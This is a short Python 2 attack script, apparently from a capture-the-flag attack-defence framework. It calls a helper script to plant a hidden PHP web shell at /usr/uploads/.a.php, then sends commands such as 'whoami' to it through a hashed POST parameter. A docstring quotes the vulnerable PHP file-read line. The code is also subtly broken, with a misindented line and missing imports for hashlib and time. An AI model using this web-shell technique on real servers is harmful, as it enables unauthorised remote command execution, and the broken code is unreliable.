#!/usr/bin/env python

import requests,re,os
from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback
from random import randint

def vulnerable_attack(target,target_port,cmd):
		
	'''
	this is the payload script for vuln:

	echo file_get_contents($_POST[444]);

	'''

	try:
		data = cmd
		#res = http("get",target,target_port,"/bigbrother?filename="+data,'',headers)
	res = shit(target,target_port,data)
		# Even though we can not execute the cmd with the vuln, but we can read flag
		# and we want to use our framework to carry out this attack
		# not do the replicate tasks to code a new script
	except Exception,e:
		debug_print(traceback.format_exc())     
		dump_error("attack failed",target,"vulnerable attack")
		res = "error"

	return res

def shit(target,target_port,cmd):
	s = requests.Session()
	url_1 = 'http://%s:%s' % (target,str(target_port))
	shell_hash = '_' + hashlib.md5(str(time.time()) + url_1).hexdigest()[0:8]
	res = os.popen('python ./not_use/ser.py %s %s'%(url_1,shell_hash)).read()
	print res

	url_2 = url_1 + '/usr/uploads/.a.php'
	res = s.post(url_2,data={shell_hash:cmd}).content
	return res

if __name__ == '__main__':
	shit('127.0.0.1',80,'whoami')
